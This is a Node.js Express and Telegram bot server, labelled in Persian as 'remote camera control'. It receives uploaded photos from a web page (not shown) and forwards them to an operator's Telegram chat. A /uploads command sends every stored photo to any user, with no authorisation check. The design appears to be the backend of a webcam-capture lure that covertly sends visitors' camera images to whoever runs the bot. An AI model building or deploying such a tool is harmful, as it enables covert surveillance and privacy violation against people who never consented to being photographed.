const express = require('express');
const multer = require('multer');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fs = require('fs');
const axios = require('axios');
require('dotenv').config();

const app = express();
const upload = multer({ dest: 'uploads/' });

const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Store uptime logs
const uptimeLogs = [];

function keepServerAlive() {
  if (process.env.GLITCH_PROJECT_URL) {
    const pingInterval = setInterval(() => {
      const pingTimestamp = new Date();
      
      axios.get(process.env.GLITCH_PROJECT_URL)
        .then(() => {
          const log = {
            timestamp: pingTimestamp,
            status: 'successful',
            message: 'Uptime ping successful'
          };
          uptimeLogs.push(log);
          console.log(`Uptime ping successful at ${pingTimestamp}`);
        })
        .catch(error => {
          const log = {
            timestamp: pingTimestamp,
            status: 'failed',
            message: error.message
          };
          uptimeLogs.push(log);
          console.error(`Uptime ping failed at ${pingTimestamp}:`, error.message);
        });
    }, 5 * 60 * 1000);
  }
}

// Add Telegram command to view uptime logs
bot.onText(/\/uptimelog/, (msg) => {
  if (uptimeLogs.length === 0) {
    bot.sendMessage(msg.chat.id, 'No uptime logs available.');
    return;
  }

  // Limit to last 10 logs
  const logsToShow = uptimeLogs.slice(-10).map(log => 
    `🕒 ${log.timestamp.toLocaleString()}\n` +
    `📡 Status: ${log.status === 'successful' ? '✅ موفق' : '❌ ناموفق'}\n` +
    `📝 Message: ${log.message}`
  ).join('\n\n');

  bot.sendMessage(msg.chat.id, `آخرین لاگ‌های اپتایم:\n\n${logsToShow}`, {
    parse_mode: 'HTML'
  });
});

app.use(express.static(__dirname));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/upload-photo', upload.single('photo'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).send('No photo uploaded');
    }

    await bot.sendPhoto(CHAT_ID, req.file.path);
    
    res.status(200).send('Photo uploaded and sent to Telegram');
  } catch (error) {
    console.error('Error uploading photo:', error);
    res.status(500).send('Error uploading photo');
  }
});

bot.onText(/\/start/, (msg) => {
  const welcomeMessage = `
📸 کنترل دوربین راه دور

دستورات موجود:
• /uploads - مشاهده تمام عکس‌های آپلود شده
• /uptimelog - مشاهده لاگ‌های اپتایم سرور
• /help - راهنمای کامل دستورات

لطفاً دستور مورد نظر خود را انتخاب کنید.
`;

  const keyboard = {
    keyboard: [
      ['/uploads', '/uptimelog'],
      ['/help']
    ],
    resize_keyboard: true,
    one_time_keyboard: true
  };

  bot.sendMessage(msg.chat.id, welcomeMessage, {
    reply_markup: JSON.stringify(keyboard)
  });
});

// Add help command
bot.onText(/\/help/, (msg) => {
  const helpMessage = `
🤖 راهنمای کامل ربات

دستورات موجود:
• /start - شروع و نمایش منوی اصلی
• /uploads - مشاهده تمام عکس‌های آپلود شده
• /uptimelog - مشاهده لاگ‌های اپتایم سرور
• /help - نمایش این راهنما

برای استفاده از امکانات، از دکمه‌های زیر استفاده کنید.
`;

  const keyboard = {
    keyboard: [
      ['/uploads', '/uptimelog'],
      ['/help']
    ],
    resize_keyboard: true,
    one_time_keyboard: true
  };

  bot.sendMessage(msg.chat.id, helpMessage, {
    reply_markup: JSON.stringify(keyboard)
  });
});

bot.onText(/\/uploads/, async (msg) => {
  const uploadsDir = path.join(__dirname, 'uploads');
  
  try {
    const files = fs.readdirSync(uploadsDir)
      .filter(file => file !== '.gitkeep') // Exclude .gitkeep if it exists
      .map(file => path.join(uploadsDir, file));

    if (files.length === 0) {
      bot.sendMessage(msg.chat.id, 'No uploads found.');
      return;
    }

    for (const filePath of files) {
      try {
        await bot.sendPhoto(msg.chat.id, filePath);
      } catch (sendError) {
        console.error(`Error sending file ${filePath}:`, sendError);
        bot.sendMessage(msg.chat.id, `Could not send file: ${path.basename(filePath)}`);
      }
    }
  } catch (error) {
    console.error('Error reading uploads directory:', error);
    bot.sendMessage(msg.chat.id, 'Error retrieving uploads.');
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  keepServerAlive();
});